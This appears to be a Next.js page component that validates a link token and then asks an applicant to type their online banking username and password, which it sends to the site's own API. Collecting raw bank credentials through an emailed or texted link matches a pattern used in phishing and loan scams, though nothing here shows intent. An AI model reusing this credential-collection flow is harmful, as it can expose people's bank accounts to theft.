"use client";

import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { api, ApiError } from "@/lib/api";

export default function BankLoginContent() {
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Resolved-from-token application id + applicant first name.
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [resolving, setResolving] = useState<boolean>(!!token);
  const [tokenError, setTokenError] = useState<string | null>(null);

  // Validate the token up front so we can show a clear error before the
  // applicant bothers typing anything.
  useEffect(() => {
    if (!token) {
      setResolving(false);
      return;
    }
    let cancelled = false;
    setResolving(true);
    api
      .resolveBankCredentialsToken(token)
      .then((app) => {
        if (!cancelled) setApplicationId(app.application_id);
      })
      .catch(() => {
        if (!cancelled)
          setTokenError(
            "This bank verification link is invalid or has expired. Please ask us to send a new one.",
          );
      })
      .finally(() => {
        if (!cancelled) setResolving(false);
      });
    return () => {
      cancelled = true;
    };
  }, [token]);

  if (token && resolving) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-slate-100">
        <div className="rounded-2xl bg-white p-8 shadow-lg text-gray-600">
          Validating your secure link…
        </div>
      </div>
    );
  }

  if (!token || tokenError) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-slate-100">
        <div className="max-w-md rounded-2xl bg-white p-8 shadow-lg">
          <h2 className="text-xl font-semibold text-red-600">
            Invalid Verification Link
          </h2>
          <p className="mt-2 text-gray-600">
            {tokenError ?? "Please use the secure link sent to your email or SMS."}
          </p>
        </div>
      </div>
    );
  }

  const handleSubmit = async () => {
    setError(null);
    if (!username.trim() || !password) {
      setError("Please enter both your username and password.");
      return;
    }
    try {
      setLoading(true);
      await api.submitBankCredentials(token!, username.trim(), password);
      setSuccess(true);
    } catch (err) {
      setError(
        err instanceof ApiError
          ? err.message
          : "Something went wrong. Please try again.",
      );
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-slate-100">
        <div className="max-w-md rounded-3xl bg-white p-10 text-center shadow-xl">
          <div className="text-6xl">✅</div>
          <h2 className="mt-4 text-2xl font-bold text-green-600">
            Submitted Successfully
          </h2>
          <p className="mt-2 text-gray-600">
            Your bank login has been received securely and is under review.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-100 py-12">
      <div className="mx-auto max-w-md px-4">
        <div className="overflow-hidden rounded-3xl bg-white shadow-xl">
          <div className="bg-[#fbbf23] p-8 text-black">
            <h1 className="text-3xl font-bold">Verify Bank Login</h1>
            <p className="mt-2 text-sm text-black/70">
              Application ID: {applicationId}
            </p>
          </div>

          <div className="space-y-5 p-8">
            <div>
              <label className="mb-2 block text-sm font-medium text-gray-700">
                Online Banking Username
              </label>
              <input
                type="text"
                autoComplete="off"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                disabled={loading}
                className="w-full rounded-xl border border-gray-300 p-3 focus:border-[#fbbf23] focus:outline-none disabled:opacity-60"
                placeholder="Enter your bank username"
              />
            </div>

            <div>
              <label className="mb-2 block text-sm font-medium text-gray-700">
                Online Banking Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  autoComplete="off"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={loading}
                  className="w-full rounded-xl border border-gray-300 p-3 pr-16 focus:border-[#fbbf23] focus:outline-none disabled:opacity-60"
                  placeholder="Enter your bank password"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((v) => !v)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-medium text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>
            </div>

            {error && (
              <div className="rounded-lg border border-rose-200 bg-rose-50 px-4 py-3 text-sm text-rose-700">
                {error}
              </div>
            )}

            <button
              onClick={handleSubmit}
              disabled={loading}
              className="w-full rounded-xl bg-[#fbbf23] py-4 font-semibold text-black transition hover:brightness-95 disabled:opacity-60"
            >
              {loading ? "Submitting…" : "Submit Securely"}
            </button>

            <p className="text-center text-xs text-gray-400">
              Your information is encrypted and transmitted securely. Do not
              share this link with anyone.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
